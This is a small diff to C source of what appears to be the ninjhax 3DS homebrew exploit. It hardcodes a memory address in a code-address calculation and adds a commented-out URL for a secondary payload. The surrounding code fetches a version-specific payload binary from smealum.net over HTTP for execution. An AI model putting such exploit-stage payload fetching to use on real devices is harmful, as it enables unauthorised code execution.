@@ -234,7 +234,8 @@ void patchMem(Handle* gspHandle, u32 dst, u32 size, u32 start, u32 end)
 
 u32 computeCodeAddress(u32 offset)
 {
-	return CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+*((u32*)0x1FF80040)+offset;
+	// return CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+*((u32*)0x1FF80040)+offset;
+	return CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+0x07C00000+offset;
 }
 
 int _main()
@@ -283,6 +284,7 @@ int _main()
 	// drawHex(ret,0,line+=10);
 
 	ret=HTTPC_CreateContext(httpcHandle,"http://smealum.net/ninjhax/p/" FIRM_VERSION "_" CN_VERSION "_" SPIDER_VERSION "_" RO_VERSION ".bin", &httpContextHandle);
+	// ret=HTTPC_CreateContext(httpcHandle,"http://smealum.net/ninjhax/cn_secondary_payload.bin", &httpContextHandle);
 
 	// drawHex(ret,0,line+=10);
 	
